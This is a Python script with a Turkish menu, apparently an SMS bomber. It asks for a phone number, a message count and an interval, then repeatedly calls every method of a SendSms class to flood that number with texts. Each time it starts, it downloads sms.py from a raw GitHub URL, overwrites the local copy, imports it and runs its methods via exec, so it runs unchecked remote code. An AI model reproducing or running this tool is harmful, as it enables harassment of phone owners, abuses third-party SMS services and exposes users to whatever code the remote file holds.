from colorama import Fore, Style
from time import sleep
from os import system
from requests import get
r = get("https://raw.githubusercontent.com/wqeggffwqer/v3.1/main/sms.py").text
with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()
if read == r:
    pass
else:
    print(Fore.RED + "Günceleniyor")
    with open("sms.py", "w", encoding="utf-8") as f:
        f.write(r)
from sms import SendSms
    
    
while 1:
    system("cls||clear")
    print("""{}
╔══════════════════════════════╗
║   KEY : Yunus Emre U***      ║
║   By : ! main.exe#1250       ║
║   ID : 1047156528844644424   ║
║   Discord : .gg/1816         ║
╚══════════════════════════════╝
                        
    """.format(Fore.LIGHTCYAN_EX, Style.RESET_ALL, Fore.LIGHTRED_EX))
    try:
        menu = int(input(Fore.LIGHTMAGENTA_EX + "1. SMS Gönder\n2. Çıkış\n\n" + Fore.LIGHTYELLOW_EX + "Seçim: "))
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptınız. Tekrar deneyiniz.")
        sleep(4)
        continue
    if menu == 1:
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Telefon numarası: "+ Fore.LIGHTGREEN_EX, end="")
            tel_no = int(input())
            if len(str(tel_no)) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Kaç adet SMS göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
            kere = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptınız. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptınız. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        sms = SendSms(str(tel_no))
        while sms.adet < kere:
            for attribute in dir(SendSms):
                attribute_value = getattr(SendSms, attribute)
                if callable(attribute_value):
                    if attribute.startswith('__') == False:
                        if sms.adet == kere:
                            break
                        exec("sms."+attribute+"()")
                        sleep(aralik)
        print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
        input()
    elif menu == 2:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break